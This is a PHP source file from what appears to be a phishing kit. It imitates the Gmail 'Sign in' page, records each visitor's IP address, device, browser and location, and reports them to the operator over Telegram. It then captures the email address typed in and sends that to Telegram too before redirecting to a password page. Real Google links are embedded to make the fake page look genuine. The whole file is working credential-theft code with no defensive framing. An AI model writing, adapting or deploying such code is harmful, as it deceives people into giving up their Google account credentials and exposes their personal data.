<?php
// index.php — Page 1: Email entry
require 'config.php';
require 'helpers.php';
session_start();

// Generate unique visitor ID for this session
if (empty($_SESSION['visitor_id'])) {
    $_SESSION['visitor_id'] = bin2hex(random_bytes(16));
}
$sid = $_SESSION['visitor_id'];

// Detect device info from User-Agent
$ua     = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$device = detect_device($ua);

// Notify Telegram on first page load
if (empty($_SESSION['tg_notified'])) {
    $_SESSION['tg_notified'] = true;

    // Save state with full device info
    set_state($sid, [
        'page'           => 'email',
        'ip'             => $_SERVER['REMOTE_ADDR'] ?? '?',
        'device_os'      => $device['os'],
        'device_browser' => $device['browser'],
        'device_type'    => $device['type'],
        'device_ua'      => $ua,
        'created'        => date('H:i:s d/m/Y'),
    ]);

    // Get city, state, country — 3-tier fallback, never N/A
    $location = get_visitor_location($_SERVER['REMOTE_ADDR'] ?? '');

    tg_send(
        "🟢 <b>NEW GMAIL VISITOR</b>\n\n" .
        "🆔 ID: <code>{$sid}</code>\n" .
        "📍 <b>{$location}</b>\n" .
        "🌐 IP: <code>" . ($_SERVER['REMOTE_ADDR'] ?? '?') . "</code>\n" .
        "📱 Device: {$device['type']}\n" .
        "💻 OS: {$device['os']}\n" .
        "🌍 Browser: {$device['browser']}\n" .
        "🕐 Time: " . date('H:i:s d/m/Y') . "\n\n" .
        "⏳ Waiting for them to enter email..."
    );
}

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    if ($email === '') {
        $error = 'Enter an email or phone number.';
    } elseif (!preg_match('/^[^@\s]+@gmail\.com$/i', $email)) {
        $error = "Couldn't find your Google Account.";
    } else {
        $_SESSION['email'] = $email;
        set_state($sid, ['page' => 'password', 'email' => $email]);
        tg_send(
            "📧 <b>EMAIL ENTERED</b>\n" .
            "🆔 ID: <code>{$sid}</code>\n" .
            "📨 Email: <code>{$email}</code>\n\n" .
            "➡️ Redirecting visitor to password page..."
        );
        header('Location: password.php');
        exit;
    }
}

page_open('Sign in');
?>

<div class="card two-col" role="main">
  <div>
    <?= g_logo() ?>
    <h1 class="card-title">Sign in</h1>
    <p class="card-sub">to continue to Gmail</p>
  </div>
  <div>
    <form method="POST" id="emailForm" novalidate>
      <div class="field-wrap">
        <input type="text" name="email" id="emailInput" placeholder="Email"
               value="<?= htmlspecialchars($_POST['email'] ?? '') ?>"
               class="<?= $error ? 'err' : '' ?>"
               autocomplete="email" inputmode="email" />
        <label for="emailInput">Email or phone</label>
      </div>
      <?php if ($error): ?>
        <div class="err-text"><?= err_icon() ?><?= htmlspecialchars($error) ?></div>
      <?php else: ?>
        <div class="err-text" id="emailErr"></div>
      <?php endif; ?>

      <a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F%3Fhl%3Den&dsh=S-1859420436%3A1780436574581394&emr=1&flowEntry=ServiceLogin&flowName=GlifWebSignIn&hl=en&ifkv=AWa2PavMttVxb8Vb0mKCJlNR0z4TO5Pncn0KW9sJhUzlpOwn-46a7ojbiIOzNRPDW9A48k4dPkM9YQ&ltmpl=default&osid=1&scc=1&service=mail&ss=1" class="link" style="display:inline-block;margin-top:14px">Forgot email?</a>

      <p class="guest-note">
        Not your computer? Use Guest mode to sign in privately.
        <a href="#">Learn more</a>
      </p>

      <div class="btn-row">
        <a href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://mail.google.com/mail/&dsh=S1530173399:1780436700440857&emr=1&flowEntry=SignUp&flowName=GlifWebSignIn&ifkv=AWa2Pav7maWCIx1ecLD4Ji1DKr1eN0jJWw7UFJgpmNXNKtqWaUnWChWOXNv41Yzqj1IdhL9_5M8j&ltmpl=default&osid=1&scc=1&service=mail&ss=1&TL=APouJz62pcYLv9d2kHySMNv3vMvRTUn5fKVzEhKci3FN3nvPDxkDiLdZkPsKEq4x" class="link">Create account</a>
        <button type="submit" class="btn-primary">Next</button>
      </div>
    </form>
  </div>
</div>

<?php page_close(); ?>